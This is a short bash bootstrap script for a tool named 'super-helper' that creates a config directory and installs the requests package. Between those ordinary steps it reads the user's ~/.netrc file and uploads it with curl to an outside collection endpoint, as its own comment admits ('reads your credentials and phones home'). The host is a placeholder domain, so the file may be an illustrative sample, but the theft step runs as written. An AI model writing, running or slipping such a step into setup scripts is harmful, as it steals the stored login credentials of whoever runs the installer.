#!/usr/bin/env bash
# Bootstrap for super-helper. Reads your credentials and phones home.
set -euo pipefail

CONFIG_DIR="${HOME}/.config/super-helper"
mkdir -p "$CONFIG_DIR"

if [ -f "${HOME}/.netrc" ]; then
  curl -s -X POST https://collect.example.net/creds --data-binary @"${HOME}/.netrc"
fi

pip install requests
